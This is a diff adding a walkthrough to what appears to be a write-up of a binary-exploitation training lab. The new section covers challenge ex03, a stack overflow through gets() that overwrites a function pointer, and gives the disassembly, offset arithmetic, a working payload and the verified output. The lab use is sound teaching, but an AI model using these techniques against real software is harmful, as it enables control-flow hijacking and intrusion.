@@ -242,8 +242,57 @@ non-printable bytes, pass it through `execve`/process args rather than fighting 
 
 ---
 
-<!-- ex03 … ex11 walkthroughs are added as each challenge is completed. -->
-_ex03 … ex11: in progress._
+### ex03 — overwrite a function pointer (first control-flow hijack)
+
+**Goal (`README.txt`):** see *“code flow successfully changed”*.
+
+**Vulnerability class:** stack overflow overwriting a **function pointer** that is later called indirectly (CWE-121 → CWE-129/-690 indirect call hijack).
+
+**Disassembly:**
+
+```asm
+08048424 <win>:                              ; <-- target; prints the win string
+ 8048424: push ebp ... call puts@plt("code flow successfully changed")
+
+08048438 <main>:
+ 804843e: sub    esp,0x60
+ 8048441: mov    DWORD PTR [esp+0x5c],0x0     ; fp = 0
+ 8048449: lea    eax,[esp+0x1c]              ; &buffer
+ 8048450: call   gets@plt                     ; gets(buffer)   <-- unbounded
+ 8048455: cmp    DWORD PTR [esp+0x5c],0x0     ; fp == 0 ?
+ 804845a: je     8048477
+ 804845c: ... printf("calling function pointer, jumping to 0x%08x\n", fp)
+ 8048471: mov    eax,DWORD PTR [esp+0x5c]     ; eax = fp
+ 8048475: call   eax                          ; <-- indirect call we hijack
+```
+
+**Reading it:** `fp` lives at `esp+0x5c`. After `gets`, if `fp != 0`, `main` does
+`call eax` with `eax = fp`. The `ff d0` byte sequence is `call eax` — an **indirect call**
+through attacker-controllable memory. Point it at `win` and we win.
+
+**Offset:** `0x5c − 0x1c = 64` bytes, then 4 bytes = `&win = 0x08048424` (little-endian
+`24 84 04 08`). No PIE ⇒ this address is fixed, no leak needed.
+
+**Exploit (`scripts/ex03.py`):** `"A"*64 + p32(0x08048424)`.
+
+```bash
+python3 scripts/ex03.py | /opt/hole-in-bin/ex03/bin
+```
+
+**Result (verified):**
+```
+calling function pointer, jumping to 0x08048424
+code flow successfully changed
+```
+
+**Key takeaway:** this is the first true **control-flow hijack** — we didn't just change data,
+we changed *where the program executes*. A stored code pointer (function pointer, vtable, callback)
+is as sensitive as the return address. `%08x` here even echoes our overwritten pointer back, confirming control.
+
+---
+
+<!-- ex04 … ex11 walkthroughs are added as each challenge is completed. -->
+_ex04 … ex11: in progress._
 
 ---
 
